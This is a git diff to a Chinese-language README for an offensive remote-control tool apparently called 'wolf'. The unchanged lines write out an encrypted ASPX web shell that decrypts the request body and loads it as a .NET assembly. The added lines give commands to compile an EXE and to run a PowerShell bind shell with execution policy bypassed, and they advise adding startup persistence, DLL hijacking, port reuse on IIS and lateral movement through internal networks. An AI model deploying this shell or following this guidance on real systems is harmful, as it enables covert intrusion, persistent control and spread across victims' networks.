@@ -112,6 +112,21 @@ echo 3c25402050616765204c616e67756167653d2243232220253e3c25696620285265717565737
 echo ^<%@ Page Language="C#" %^> > wolf.aspx && echo ^<% if (Request.Cookies.Count != 0) { >> wolf.aspx && echo byte[] k = Encoding.Default.GetBytes("ca63457538b9b1e0"); >> wolf.aspx && echo System.IO.Stream s = Request.InputStream; >> wolf.aspx && echo byte[] c = new byte[s.Length]; >> wolf.aspx && echo s.Read(c, 0, c.Length); >> wolf.aspx && echo System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("K").Equals(this); >> wolf.aspx && echo } %^> >> wolf.aspx
 ```
 
+### 编译EXE
+```bash
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:wolf.exe wolf.cs
+```
+PS：可自行修改，添加启动项，实现持久化，结合级联功能，内网横行。 也可以根据该代码修改成DLL，通过DLL劫持级联控制内网多台机器。
+
+### PowerShell正向马
+```bash
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File wolf.ps1
+```
+### 端口复用
+
+若目标存在IIS，不管是PowerShell还是exe版，均支持端口复用
+
+
 ## 功能示例
 
 ### 自定义.NET程序执行
